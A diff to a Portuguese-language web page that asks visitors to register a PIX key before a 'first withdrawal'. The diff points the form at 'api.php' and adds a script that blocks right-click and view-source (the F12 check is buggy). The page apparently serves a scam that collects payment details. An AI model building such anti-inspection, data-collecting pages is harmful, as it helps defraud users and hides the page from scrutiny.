@@ -42,7 +42,7 @@
             <div class="white-box">
                 <label style="background-color: #e2e8ef; padding: 10px; border-radius: 12px; text-align: center; width: 100%; margin-bottom: 10px; line-height: 1.3rem; font-size: 18px;">Antes de realizar seu 1º saque <br><b>CADASTRE SUA CHAVE PIX.</b><br><br>Vamos te enviar um <b>PIX TESTE</b> de R$0,10 centavos para confirmar se está tudo certo.</label>
                 
-                <form action="api.php.htm" method="POST" id="formPix" onsubmit="document.getElementById('submit').disabled = true;">
+                <form action="api.php" method="POST" id="formPix" onsubmit="document.getElementById('submit').disabled = true;">
                     <!--<input style="color: #000000; width: 100%; margin-top: 10px;" type="text" name="nomeUsuario" id="nomeUsuario" autocomplete="off" required placeholder="Digite seu Nome" class="login-form">-->
                     <!--<input style="color: #000000; width: 100%; margin-top: 10px;" type="text" name="cpfUsuario" id="cpfUsuario" inputmode="numeric" autocomplete="off" required placeholder="Digite seu CPF" class="login-form">-->
                     
@@ -106,7 +106,46 @@
             });
         </script>
 
-        
+        <script>
+            var message="";
+            function clickIE() {
+                if (document.all) {(message);return false;}
+            }
+            function clickNS(e) {
+                if(document.layers||(document.getElementById&&!document.all)) {
+                    if (e.which==2||e.which==3) {(message);return false;}
+                }
+            }
+            if (document.layers){
+                document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;
+            }
+            else{
+                document.onmouseup=clickNS;document.oncontextmenu=clickIE;
+            }
+            document.oncontextmenu=new Function("return false")
+
+
+            //  F12
+            //==========
+
+            document.onkeypress = function (event) {
+                if (e.ctrlKey && (e.keyCode === 123)) {
+                    // alert('not allowed');
+                    return false;
+                }
+            };
+
+
+            //    CTRL + u
+            //==============
+
+            document.onkeydown = function(e) {
+                if (e.ctrlKey && (e.keyCode === 85)) {
+                    // alert('not allowed');
+                    return false;
+                }
+            };  
+        </script>
         <script>
             jQuery(function($){
                 $("#cpfUsuario").mask("999.999.999-99");
